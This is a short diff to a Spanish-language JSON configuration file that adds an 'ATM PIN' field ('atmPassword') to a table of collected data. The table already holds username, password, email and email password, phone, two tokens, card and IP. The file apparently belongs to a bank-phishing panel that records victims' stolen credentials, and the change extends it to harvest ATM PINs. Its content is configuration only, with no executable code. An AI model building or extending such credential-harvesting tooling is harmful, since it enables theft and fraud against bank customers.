@@ -21,9 +21,13 @@
             "nameServer": "token2"
         }, 
         {
+            "name": "Clave ATM",
+            "nameServer": "atmPassword"
+        }, 
+        {
             "name": "Tarjeta",
             "nameServer": "tarjeta"
         }
     ],
-    "tableHeaderOptions": ["usuario", "clave", "Correo", "Clave del correo", "Celular", "Token1", "Token2", "Tarjeta", "Ip", "..."]
+    "tableHeaderOptions": ["usuario", "clave", "Correo", "Clave del correo", "Celular", "Token1", "Token2", "Tarjeta", "Clave ATM", "Ip", "..."]
 }
